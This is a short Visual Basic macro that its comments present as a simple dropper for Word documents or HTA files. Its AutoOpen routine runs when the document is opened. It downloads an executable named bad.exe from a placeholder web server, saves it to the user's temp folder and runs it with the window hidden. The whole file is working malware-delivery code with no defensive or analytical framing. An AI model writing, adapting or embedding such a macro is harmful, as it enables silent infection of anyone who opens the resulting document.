'VBS that can easily be ported to an HTA file or a word doc
'this is really just a simple dropper that wget's another 
'payload and execs it from a temp dir. tested on word 2010
'and HTA file with IE 11 on Windows 8.1

Sub AutoOpen()
    Dim objshell As Object
    Dim objFSO As Object
    Dim objXMLHTTP As Object
    Set objshell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    strHDLocation = objshell.ExpandEnvironmentStrings("%temp%") & "\bad.exe" 
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", "https://somewebserver.com/bad.exe", False
    objXMLHTTP.send
     
    If objXMLHTTP.Status = 200 Then
        Dim objADOStream As Object
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Open
        objADOStream.Type = 1
    
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.Position = 0
    
        Set objFSO = CreateObject("Scripting.FileSystemObject")
            If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
        Set objFSO = Nothing

        objADOStream.SaveToFile strHDLocation
        objADOStream.Close
        Set objADOStream = Nothing
    End If

    Set objXMLHTTP = Nothing
    objshell.Run strHDLocation, 0, 1
End Sub
